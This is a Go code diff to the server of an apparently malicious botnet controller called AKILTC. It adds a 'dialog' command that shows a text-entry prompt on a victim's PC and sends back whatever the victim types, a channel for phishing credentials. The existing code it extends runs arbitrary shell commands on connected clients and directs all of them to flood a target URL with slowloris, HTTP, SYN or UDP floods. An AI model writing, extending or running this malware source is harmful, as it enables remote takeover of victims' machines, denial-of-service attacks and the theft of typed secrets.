@@ -8,6 +8,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
@@ -16,7 +17,6 @@ import (
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/charmbracelet/bubbles/spinner"
 	tea "github.com/charmbracelet/bubbletea"
-	"github.com/charmbracelet/lipgloss"
 	"github.com/fatih/color"
 	"github.com/magodo/textinput"
 
@@ -35,7 +35,14 @@ type floodParamas struct {
 	limit       int
 }
 
+type DialogParams struct {
+	ShouldUpdate bool
+	DialogPrompt string
+	DialogTitle  string
+}
+
 var flood_params *floodParamas = nil
+var dialog_params *DialogParams = nil
 
 var current_id string = ""
 
@@ -43,8 +50,12 @@ var client_ids []string
 var client_mapids map[int]string = make(map[int]string)
 
 var client_onscreentext map[string]string = make(map[string]string)
+
 var client_execcommand map[string]string = make(map[string]string)
 var client_execoutput map[string]string = make(map[string]string)
+
+var client_dialog map[string]string = make(map[string]string)
+var client_dialogoutput map[string]string = make(map[string]string)
 
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
@@ -174,8 +185,35 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 	return &pb.FloodData{ShouldFlood: false}, nil
 }
 
-func (s *server) GetDialog(context.Context, *pb.Void) (*pb.DialogData, error) {
+func (s *server) GetDialog(ctx context.Context, in *pb.ClientDataRequest) (*pb.DialogData, error) {
+	if !Contains(client_ids, in.ClientId) {
+		client_ids = append(client_ids, in.ClientId)
+	}
+
+	if dialog_params != nil {
+		x := dialog_params
+		dialog_params = nil
+
+		if in.GetClientId() == current_id {
+			return &pb.DialogData{
+				ShouldShowDialog: x.ShouldUpdate,
+				DialogTitle:      x.DialogTitle,
+				DialogPrompt:     x.DialogPrompt}, nil
+		}
+	}
+
 	return &pb.DialogData{ShouldShowDialog: false}, nil
+}
+
+func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.Void, error) {
+	if id := in.GetId(); id != nil {
+		if id.ClientId == current_id {
+			client_dialogoutput[current_id] = ""
+			client_dialogoutput[current_id] = in.GetEntryText()
+		}
+	}
+
+	return &pb.Void{}, nil
 }
 
 type model struct {
@@ -189,6 +227,7 @@ type model struct {
 	showfloodusage      bool
 	showfloodoutput     bool
 	showexecout         bool
+	showdialogoutput    bool
 	err                 error
 	clients             []string
 
@@ -208,8 +247,12 @@ func initialModel() model {
 	ti.CharLimit = 156
 	ti.Width = 20
 
-	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients", "cleartext", "flood"}
-	ti.StyleCandidate.Foreground(lipgloss.Color("#BC4749"))
+	ti.CandidateWords = []string{
+		"help", "settext",
+		"select", "exit",
+		"exec", "list_clients",
+		"cleartext", "flood",
+		"dialog"}
 	ti.CandidateViewMode = textinput.CandidateViewHorizental
 
 	s := spinner.New()
@@ -227,6 +270,7 @@ func initialModel() model {
 		showexecout:         false,
 		showfloodusage:      false,
 		showfloodoutput:     false,
+		showdialogoutput:    false,
 		clients:             client_ids,
 
 		spinner: s,
@@ -255,6 +299,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		case "esc", "q":
 			m.shownotvalidcommand = false
 			m.shownotvalidtext = false
+			m.showdialogoutput = false
 			m.shownotvalidcid = false
 			m.showfloodusage = false
 			m.showclientlist = false
@@ -350,6 +395,23 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 				m.showfloodoutput = true
 			}
 
+			if len(m.textInput.Value()[:6]) == 6 && m.textInput.Value()[:6] == "dialog" {
+				split_str := strings.Fields(m.textInput.Value())
+				r := regexp.MustCompile(`\".*?\"`)
+				matches := r.FindAllString(strings.Join(split_str[1:], " "), -1)
+
+				for idx := range matches {
+					matches[idx] = strings.ReplaceAll(matches[idx], "\"", "")
+				}
+
+				dialog_params = &DialogParams{
+					ShouldUpdate: true,
+					DialogPrompt: matches[0],
+					DialogTitle:  matches[1],
+				}
+				m.showdialogoutput = true
+			}
+
 			switch m.textInput.Value() {
 			case "help":
 				m.showhelplist = true
@@ -380,13 +442,14 @@ func (m model) View() string {
 		green := color.New(color.FgGreen).SprintFunc()
 
 		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
-			green("select") + "\nselect a client to connect to (usage: " + yellow("select [`client id`]") + ")\n\n" +
+			green("select") + "\nselect a client to connect to (usage: " + yellow("select [client id]") + ")\n\n" +
 			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
-			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
-			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
+			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [text]") + ")\n\n" +
+			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [command string]") + ")\n\n" +
 			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n\n" +
 			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")\n\n" +
-			green("flood") + "\nflood a url using all clients (usage: " + yellow("flood [url] [time limit] [worker count] [flood type]") + ") " + "flood type can be (slowloris, httpflood, synflood, udpflood)\n"
+			green("flood") + "\nflood a url using all clients (usage: " + yellow("flood [url] [time limit] [worker count] [flood type]") + ") " + "flood type can be (slowloris, httpflood, synflood, udpflood)\n\n" +
+			green("dialog") + "\nshow a a text entry dialog on client PC (usage: " + yellow("dialog [prompt] [text]") + ")\n"
 	}
 	if m.showclientlist {
 		Magenta := color.New(color.FgMagenta).SprintFunc()
@@ -418,9 +481,11 @@ func (m model) View() string {
 		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [worker count] [flood type] "+"flood type can be (slowloris, httpflood, synflood, udpflood)\n")
 	}
 	if m.showfloodoutput {
-
 		(&m).showfloodoutput = false
 		return m.textInput.View()
+	}
+	if m.showdialogoutput {
+		return m.textInput.View() + "\n\n" + client_dialogoutput[current_id]
 	}
 
 	return color.RedString(banner) + "\n" + m.textInput.View()
